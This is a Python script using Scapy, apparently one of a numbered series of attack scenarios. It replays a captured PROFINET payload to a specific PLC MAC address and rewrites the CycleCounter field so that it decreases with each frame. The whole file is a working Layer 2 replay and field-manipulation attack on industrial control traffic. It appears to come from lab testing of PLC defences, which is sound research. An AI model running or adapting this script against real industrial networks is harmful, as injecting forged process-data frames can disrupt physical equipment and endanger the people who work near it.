# Sixth Scenario: Replay with field manipulation (Decreasing CycleCounter)

import os
import sys
import time
import logging
from scapy.all import Ether, sendp, conf, wrpcap, Raw

# ----- CONFIG -----
IFACE = "eth0"

SRC_MAC = "30:b8:51:03:21:a2"
DST_MAC = "00:0d:1e:1c:64:32"      # from screenshot

PACKETS =15         # how many PNIO frames you want to send
CYCLE_START = 0       # first CycleCounter value
CYCLE_STEP = 64       # increment per packet (like your PLC)

SEND_INTERVAL = 0.00137  # seconds between frames (2 ms => ~500 pps).
                       # Use 0 for "as fast as possible".

LOG_FILE = "/tmp/layer2_sender.log"
PCAP_SAVE = "/tmp/layer2_sent.pcap"
VERBOSE_PROGRESS = True
# -------------------

# Setup logger
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("layer2_sender")

# this is EXACTLY the PROFINET payload from your Wireshark screenshot
PROFINET_PAYLOAD_HEX = """
80 00
80 80 80 80 1f 40 80 80 80 80 80 80 80 80 80 80
80 80 80 80 03 80 03 80 00 00 00 00 80 00 00 00
00 80 00 00 4e 20 80 00 00 80 00 00 80 00 00 80
00 80 00 00 80 00 00 80 00 80 80 80 80 80 80 80
80 80 80 80 80 80 80 80 03 e8 80 03 e8 80 03 e8
80 00 00 00 00 00 80 00 80 80 80 80 80 80 80 80
80 80 80 80 00 80 00 80 00 80 00 80 01 81 80 01
80 75 80 35 00
""".strip()

# template payload as mutable bytes
PROFINET_PAYLOAD_TEMPLATE = bytearray(
    bytes.fromhex(" ".join(PROFINET_PAYLOAD_HEX.split()))
)

# indexes (from the end) of the two bytes forming the CycleCounter
# last 5 bytes: [ -5]=0x80, [-4]=high, [-3]=low, [-2]=DataStatus, [-1]=TransferStatus
CYCLECOUNTER_HIGH_IDX = -4
CYCLECOUNTER_LOW_IDX = -3


def build_payload_with_cycle(counter: int) -> bytes:
    """Return a payload with the given 16-bit cycle counter."""
    payload = bytearray(PROFINET_PAYLOAD_TEMPLATE)
    counter &= 0xFFFF           # make sure it stays in 0..65535
    payload[CYCLECOUNTER_HIGH_IDX] = (counter >> 8) & 0xFF
    payload[CYCLECOUNTER_LOW_IDX] = counter & 0xFF
    return bytes(payload)


def make_profinet_frame(dst_mac, src_mac, cycle_counter):
    """
    Build ONE frame:
    Ether(dst, src, type=0x8892) / Raw(load=PROFINET_PAYLOAD with given cycle)
    """
    payload = build_payload_with_cycle(cycle_counter)
    return Ether(dst=dst_mac, src=src_mac, type=0x8892) / Raw(load=payload)


def main():
    if os.geteuid() != 0:
        logger.error("This script must be run as root (sudo). Exiting.")
        sys.exit(1)

    logger.info(f"Interface: {IFACE}")
    logger.info(f"Destination MAC: {DST_MAC}")
    logger.info(f"Packets to send: {PACKETS}")
    logger.info(f"Cycle start: {CYCLE_START}, step: {CYCLE_STEP}")
    logger.info(f"Send interval: {SEND_INTERVAL}s")
    conf.iface = IFACE

    # 1) Pre-build all frames (no sending yet)
    frames = []
    for i in range(PACKETS):
        cycle = (CYCLE_START - i * CYCLE_STEP) & 0xFFFF
        frame = make_profinet_frame(DST_MAC, SRC_MAC, cycle)
        frames.append(frame)

    logger.info("All frames built, starting sendp() burst...")

    # 2) Send in one burst with controlled inter-frame spacing
    #    Scapy will handle the loop internally with less Python overhead.
    sendp(frames, iface=IFACE, inter=SEND_INTERVAL, verbose=False)

    logger.info("Finished sending frames.")

    # 3) Save pcap (optional)
    try:
        if frames:
            wrpcap(PCAP_SAVE, frames)
            logger.info(f"Saved sent frames to {PCAP_SAVE}")
    except Exception:
        logger.exception("Failed to write pcap")


if __name__ == "__main__":
    main()